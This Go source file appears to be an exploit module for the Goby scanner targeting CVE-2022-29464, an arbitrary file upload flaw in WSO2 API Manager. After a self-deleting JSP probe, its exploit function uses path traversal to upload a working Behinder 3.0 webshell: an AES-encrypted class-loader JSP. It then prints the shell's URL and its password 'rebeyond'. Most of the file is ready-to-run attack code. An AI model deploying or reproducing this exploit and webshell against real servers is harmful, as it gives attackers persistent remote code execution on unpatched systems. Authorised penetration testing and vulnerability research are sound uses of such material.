package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "WSO2 API Manager toolsAny Api Arbitrary File Upload (CVE-2022-29464)",
    "Description": "<p>WSO2 API Manager is a set of API life cycle management solutions of the American WSO2 company.</p><p>There is a security vulnerability in WSO2 API Manager, which is caused by the lack of strict inspection of the file upload interface, resulting in an arbitrary file upload vulnerability.</p>",
    "Impact": "<p>WSO2 API Manager Arbitrary File Upload (CVE-2022-29464)</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2021-1738\">https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2021-1738</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "WSO2 API Manager",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload"
    ],
    "Translation": {
        "CN": {
            "Name": "WSO2 API Manager toolsAny 接口任意文件上传漏洞（CVE-2022-29464）",
            "Product": "WSO2 API Manager",
            "Description": "<p>WSO2 API Manager是美国WSO2公司的一套API生命周期管理解决方案。</p><p>WSO2 API Manager 存在安全漏洞，该漏洞源于对文件上传接口缺少严格检查，导致存在任意文件上传漏洞。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2021-1738\">https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2021-1738</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>WSO2 API Manager 存在安全漏洞，该漏洞源于对文件上传接口缺少严格检查，导致存在任意文件上传漏洞。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "WSO2 API Manager toolsAny Api Arbitrary File Upload (CVE-2022-29464)",
            "Product": "WSO2 API Manager",
            "Description": "<p>WSO2 API Manager is a set of API life cycle management solutions of the American WSO2 company.</p><p>There is a security vulnerability in WSO2 API Manager, which is caused by the lack of strict inspection of the file upload interface, resulting in an arbitrary file upload vulnerability.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2021-1738\">https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2021-1738</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>WSO2 API Manager Arbitrary File Upload (CVE-2022-29464)</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "FofaQuery": "title=\"WSO2\" || header=\"Server: WSO2 Carbon Server\" || banner=\"Server: WSO2 Carbon Server\"",
    "GobyQuery": "title=\"WSO2\" || header=\"Server: WSO2 Carbon Server\" || banner=\"Server: WSO2 Carbon Server\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://docs.wso2.com/",
    "DisclosureDate": "2022-04-21",
    "References": [
        "https://github.com/hakivvi/CVE-2022-29464"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2022-29464"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202204-3737"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "Behinder3.0",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10358"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			RandName := goutils.RandomHexString(4)
			uri1 := "/fileupload/toolsAny"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "multipart/form-data; boundary=6f177d2126f33363ebb2160af34d535f")
			cfg1.Data = fmt.Sprintf("--6f177d2126f33363ebb2160af34d535f\r\nContent-Disposition: form-data; name=\"../../../../repository/deployment/server/webapps/authenticationendpoint/%s.jsp\"; filename=\"%s.jsp\"\r\n\r\n<%%out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer(\"ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=\")));new java.io.File(application.getRealPath(request.getServletPath())).delete();%%>\r\n--6f177d2126f33363ebb2160af34d535f--\r\n", RandName, RandName)
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil && resp1.StatusCode == 200 {
				uri2 := fmt.Sprintf("/authenticationendpoint/%s.jsp", RandName)
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "e165421110ba03099a1c0393373c5b43")
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if ss.Params["AttackType"].(string) == "Behinder3.0" {
				RandName := goutils.RandomHexString(4)
				uri1 := "/fileupload/toolsAny"
				cfg1 := httpclient.NewPostRequestConfig(uri1)
				cfg1.VerifyTls = false
				cfg1.FollowRedirect = false
				cfg1.Header.Store("Content-Type", "multipart/form-data; boundary=6f177d2126f33363ebb2160af34d535f")
				cfg1.Data = fmt.Sprintf("--6f177d2126f33363ebb2160af34d535f\r\nContent-Disposition: form-data; name=\"../../../../repository/deployment/server/webapps/authenticationendpoint/%s.jsp\"; filename=\"%s.jsp\"\r\n\r\n<%%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%%><%%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%%><%%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%%>\r\n--6f177d2126f33363ebb2160af34d535f--\r\n", RandName, RandName)
				if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil && resp1.StatusCode == 200 {
					expResult.Output = "Webshell: " + expResult.HostInfo.FixedHostInfo + "/authenticationendpoint/" + RandName + ".jsp\n"
					expResult.Output += "Password：rebeyond\n"
					expResult.Output += "Webshell tool: Behinder v3.0"
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
